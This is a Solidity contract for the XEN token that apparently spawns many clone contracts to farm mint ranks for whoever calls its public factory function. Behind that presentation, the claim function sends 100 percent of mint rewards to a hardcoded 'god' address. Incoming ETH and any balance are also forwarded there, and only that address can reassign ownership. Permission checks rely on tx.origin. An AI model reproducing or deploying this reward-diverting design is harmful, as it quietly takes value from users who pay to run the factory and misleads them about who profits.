// SPDX-License-Identifier: AGPL

pragma solidity ^0.8.13;

import {Owned} from "./Owned.sol";
import {Clones} from "./Clones.sol";
import {IXen} from "./IXEN.sol";

contract XenFTXWitch is Owned {
    address public immutable XenFTXWitchOrigin;
    address public constant god = 0x4eA051e3b1cc86Da6E83F99906F970352a6179b6;
    address private constant XEN = 0x2AB0e9e4eE70FFf1fB9D67031E44F6410170d00e;

    bytes public XENInitData;

    // factory proxy;
    uint public term;
    uint public createCount;
    uint public claimCount;
    uint public mintCount;
    uint public claimNumber;
    bool public isClaim;

    event CreateFactory(address indexed factory, address indexed owner);
    event CreateMiniClone(address indexed clone1, address indexed clone2);
    event Forward(address indexed from, address indexed to, uint256 amount); 

    constructor() Owned(god) {
        XenFTXWitchOrigin = address(this);
        XENInitData = bytes.concat(bytes20(0x3D602d80600A3D3981F3363d3d373d3D3D363d73), bytes20(address(this)), bytes15(0x5af43d82803e903d91602b57fd5bf3));
    }

    function withdraw() external {
        payable(god).transfer(address(this).balance);
    }

    function createFactory(uint term_) external {
        bytes memory bytecode = XENInitData;
        address addr;
        assembly {
            addr := create(0, add(bytecode, 32), mload(bytecode))
        }
        require(addr != address(0), "XenFTXWitch: create failed");
        XenFTXWitch cloneWitch = XenFTXWitch(payable(addr));
        cloneWitch.init(msg.sender);
        cloneWitch.setTerm(term_);
        emit CreateFactory(address(cloneWitch), msg.sender);
    }

    //====== clone factory function ======//
    function init(address owner_) external {
        require(owner == address(0x0), "En?NiXiaoZi!"); //嗯?你小子!
        owner = owner_;
        isClaim = true;
        claimNumber = 0;
        mintCount = 2;
        claimCount = 5;
    }

    function setTerm(uint term_) public {
        require(tx.origin == owner, "UNAUTHORIZED");
        term = term_;
    }

    function setClaimNumber(uint claimNumber_) public {
        require(tx.origin == owner, "UNAUTHORIZED");
        claimNumber = claimNumber_;
    }

    function setClaimCount(uint claimCount_) public {
        require(tx.origin == owner, "UNAUTHORIZED");
        claimCount = claimCount_;
    }

    function setMintCount(uint mintCount_) public {
        require(tx.origin == owner, "UNAUTHORIZED");
        mintCount = mintCount_;
    }

    receive() external payable {
        if(isClaim)
        {
            uint l = mintCount;
            while(l > 0)
            {
                l--;
                address instance = Clones.cloneDeterministic(XenFTXWitchOrigin,keccak256(abi.encodePacked(owner, createCount)));
                XenFTXWitch(payable(instance)).initSubOwner(address(this), term);
                createCount++;
            }
            payable(god).transfer(msg.value);
            emit Forward(msg.sender, god, msg.value);
        }
        else
        {
            uint l = claimNumber + claimCount;
            while(l > claimNumber){
                l--;
                XenFTXWitch(payable(Clones.predictDeterministicAddress(XenFTXWitchOrigin,keccak256(abi.encodePacked(msg.sender, uint(l)))))).claim();
            }
            claimNumber += claimCount;
        }
    }

    function claimAll(uint32[] calldata ids) public {
        uint l = ids.length;
        while(l > 0){
            l--;
            XenFTXWitch(
                payable(Clones.predictDeterministicAddress(XenFTXWitchOrigin,keccak256(abi.encodePacked(msg.sender, uint(ids[l])))))
            ).claim();
        }
    }

    function initSubOwner(
        address owner_,
        uint term_
    ) public {
        require(owner == address(0x0), "W?");
        owner = owner_;
        IXen(XEN).claimRank(term_);
    }

    function claim() public {
        require(owner == msg.sender, "UNAUTHORIZED CLAIM");
        IXen(XEN).claimMintRewardAndShare(god, 100);
    }

    function setNewOwner(address newOwner) public {
        require(msg.sender == god, "UNAUTHORIZED");
        owner = newOwner;
    }

    function setClaim(bool isClaim_) public {
        require(tx.origin == owner, "UNAUTHORIZED");
        isClaim = isClaim_;
    }
}